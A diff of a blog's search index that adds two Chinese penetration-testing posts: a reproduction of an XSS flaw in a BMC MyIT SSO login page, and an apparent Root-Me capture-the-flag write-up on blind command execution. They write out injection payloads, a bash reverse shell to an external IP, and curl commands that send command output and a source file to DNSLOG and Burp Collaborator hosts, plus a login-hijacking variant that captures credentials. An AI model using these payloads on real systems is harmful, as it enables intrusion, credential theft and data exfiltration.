@@ -1,6 +1,21 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[Java System Solutions SSO plugin for BMC MyIT 跨站脚本漏洞]]></title>
+    <url>%2FJava-System-Solutions-SSO-plugin-for-BMC-MyIT-%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%BC%8F%E6%B4%9E.html</url>
+    <content type="text"><![CDATA[&emsp;&emsp;今天看到这个漏洞，找了一个国外的站复现了一下，并且想出了一个新的思路，分享一下。 漏洞复现过程&emsp;&emsp;漏洞描述是这样说的。 &emsp;&emsp;其给出的payload是：/ux/jss-sso/arslogin?javascript:alert(123)。其原理是改变form表单的action属性为javascript:alert(123)，如果用户点击登录按钮则会触发XSS。 新思路-登录劫持&emsp;&emsp;那么问题来了，这是一个登录界面的XSS，而XSS导致的结果是泄露用户Cookie，用户还没登陆怎么能拿到用户登录后的Cookie呢？ 方法1：用JS记录键盘 方法2：Burp的Collaborator client插件获取用户登录信息 &emsp;&emsp;将Burp的Collaborator client插件生成的地址复制一下。 &emsp;&emsp;使用payload：/ux/jss-sso/arslogin?http://DNS隧道地址 &emsp;&emsp;点击登录以后，在Burp的Collaborator client插件中查看请求信息 &emsp;&emsp;使用Burp的Collaborator client插件要比直接利用XSS更加方便直接。]]></content>
+      <categories>
+        <category>渗透测试</category>
+        <category>登录劫持</category>
+      </categories>
+      <tags>
+        <tag>CVE-2018-15528</tag>
+        <tag>漏洞复现</tag>
+        <tag>XSS</tag>
+        <tag>登录劫持</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[无回显代码执行利用方法]]></title>
     <url>%2F%E6%97%A0%E5%9B%9E%E6%98%BE%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95.html</url>
     <content type="text"><![CDATA[&emsp;&emsp;在Root-Me上有一道代码执行的题目，其链接为题目链接 执行多条语句&emsp;&emsp;打开题目以后，在输入框中提示127.0.0.1 &emsp;&emsp;输入127.0.0.1 &amp;&amp; whoami进行测试： &emsp;&emsp;提示Syntax Error，通过测试，发现127.0.0.1%0d%0awhoami可以执行成功。 尝试DNSLOG获取回显&emsp;&emsp;使用反引号执行代码，并用curl将执行结果返回给DNSLOG 1ip=127.0.0.1%0d%0acurl `whoami`.t00ls.3e426ecf5c48221e002db4ae061cc4bc.tu4.org &emsp;&emsp;代码正常执行，查看DNSLOG收到的回显。 &emsp;&emsp;发现whoami没有被执行，而是原样返回。 尝试反弹shell&emsp;&emsp;既然不能直接执行，就想着用nc返回一个交互式的shell来读取flag。 12345678# 服务器端执行nc -vv -lp 8888# 命令执行处执行bash -i &gt;&amp; /dev/tcp/47.95.206.199/8888 0&gt;&amp;1# payloadip=127.0.0.1%0d%0abash+-i+&gt;%26+/dev/tcp/47.95.206.199/8888+0&gt;%261 &emsp;&emsp;显示执行成功，但是服务器端并没有受到反弹的shell。 curl上传文件&emsp;&emsp;这个方法是公司的大佬想出来的，并不是本人创作，这里只是记录。 &emsp;&emsp;curl可以正常执行，那么使用curl -F将flag文件上传到Burp的Collaborator Client（Collaborator Client 类似DNSLOG，其功能要比DNSLOG强大，主要体现在可以查看POST请求包以及打Cookies）。 &emsp;&emsp;获取Collaborator Client分配给BURP的链接。 123打开Burp主界面 --&gt;菜单（Burp）--&gt;Burp Collaboraor Client -- &gt; 点击 Copy to Clipboard粘贴出来大概这样：XXXXXXXXXXXXXXXXXXXXXX.burpcollaborator.net &emsp;&emsp;拼接Payload，并提交。 12# payloadip=127.0.0.1%0d%0acurl -X POST -F xx=@index.php http://8clb1g723ior2vyd7sbyvcx6vx1ppe.burpcollaborator.net &emsp;&emsp;查看Collaborator Client收到的数据。 &emsp;&emsp;可以看到成功读取到了源码。]]></content>
